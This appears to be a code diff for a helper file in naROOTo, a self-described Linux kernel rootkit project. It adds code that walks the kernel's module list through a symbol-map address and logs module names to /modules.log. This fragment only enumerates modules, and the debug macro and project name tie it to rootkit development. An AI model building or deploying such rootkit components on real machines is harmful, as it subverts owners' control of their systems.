@@ -1,8 +1,36 @@
+/******************************************************************************
+ *
+ * Name: count_modules.c 
+ * 
+ *
+ *****************************************************************************/
+/*
+ * This file is part of naROOTo.
+
+ * naROOTo is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+
+ * naROOTo is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+
+ * You should have received a copy of the GNU General Public License
+ * along with naROOTo.  If not, see <http://www.gnu.org/licenses/>. 
+ */
+
 #include<linux/module.h>
 #include <linux/rbtree.h>
 
 #include "include.h"
 
+struct list_head *modules = (struct list_head *) sysmap_modules;
+
+/* Get the modules from the kernfs tree 
+ * Not working right now
+ */
 int count_recursive(struct rb_node *node)
 {
         if(node == NULL) return 0;
@@ -18,21 +46,50 @@ int count_recursive(struct rb_node *node)
 
 }
 
+/* Get the module header from sysmap and iterate the list */
+int get_count(void)
+{
+	struct module* mod;
+	int count = 0;
+	struct file *fd;
+	char message[128];
+  	
+	/* create the file with write and append mode */
+	fd = filp_open("/modules.log", O_CREAT|O_WRONLY|O_APPEND|O_TRUNC, S_IRWXU);
+	
+	/* log our current op */
+	strncpy(message, "[modules log]\n", 127);
+	write_to_file(fd, message, strlen(message));
+		
+	list_for_each_entry(mod, modules, list) {
+		
+		//strncpy(message, mod->name, 127);
+		memset(message, 0, 128);
+		sprintf(message, "%s\n", mod->name);
+		write_to_file(fd, message, strlen(message));
+		//ROOTKIT_DEBUG("%s\n",mod->name);
+		count++;
+	}
+	
+		memset(message, 0, 128);
+		sprintf(message, "Number of processes = %d\n", count);
+		write_to_file(fd, message, strlen(message));
+
+	return count;
+}
 
 /* To count the number of modules */
 int count_modules(void)
 {
-	 // struct module *mod = THIS_MODULE;
-	//  struct sysfs_dirent *entry, *parent;
-	 int count = 0;
+	int count = 0;
 
-	 struct kernfs_node *kn = THIS_MODULE->mkobj.kobj.sd;
+	struct kernfs_node *kn = THIS_MODULE->mkobj.kobj.sd;
+	struct rb_node *node = kn->parent->dir.children.rb_node;
 
-	 struct rb_node *node = kn->parent->dir.children.rb_node;
+	//count = count_recursive(node);
+	count = get_count();
 
-	 count = count_recursive(node);
+	ROOTKIT_DEBUG("Total number of modules = %d\n",count);
 
-	 printk ( KERN_INFO "_detector_mod;modules %d;\n",count);
-
-	 return count;
+	return count;
 }
